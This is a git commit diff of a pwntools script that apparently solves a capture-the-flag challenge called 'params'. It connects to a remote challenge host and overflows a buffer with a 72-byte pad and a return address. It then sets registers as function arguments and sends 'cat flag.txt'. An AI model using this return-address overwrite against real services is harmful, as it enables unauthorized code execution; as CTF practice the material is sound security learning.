92cb698c2ff9f8b69ed07359d3193cb873142e80
condor0010 <liatmp3@gmail.com>
2022-07-01 03:17:37 -0400

    off by one error & str is a sensible way of doign the string stuff

--- Params/params.py
+++ Params/params.py
@@ -2,32 +2,29 @@
 from pwn import *
 
 #target = process("./params")
-
 target = remote("forever.isss.io", 1304)
 
 print(target.recvline()) # hey bb
 print(target.recvline()) # whats ur name
 
-target.sendline(cyclic(73)+p64(0x401354)) # jump to 0x0000000000401354
-
-print("overwrote return adress")
+target.sendline(cyclic(72)+p64(0x00401354)) # jump to 0x0000000000401354
 
 print(target.recvline()) # hello $NAME
 print(target.recvline()) # you can set my registers any day of the week
 
-
+# arbitrery
 target.sendline( b'0' ) # rax 
 target.sendline( b'0' ) # rbx
-target.sendline(p64(4)) # rcx
-target.sendline(p64(0xdeadbeef) ) # rdx
-target.sendline(p64(0xcafebabe) ) # rsi
-target.sendline(p64(0x1337) ) # rdi
 
+# rcx, rdx, rsi, rdi | get_flag arguments 
+target.sendline(str(4)) # rcx
+target.sendline(str(0xdeadbeef)) # rdx
+target.sendline(str(0xcafebabe)) # rsi
+target.sendline(str(0x1337)) # rdi
 
-target.interactive()
+# house cleaning
+target.recvuntil("rbx:")
 
-
-# rdi | arg1 | 0x1337
-# rsi | arg2 | 0xcafebabe
-# rdx | arg3 | 0xdeadbeef
-# rcx | arg4 | 4
+# get flag
+target.sendline(b"cat flag.txt")
+print(target.recvline())
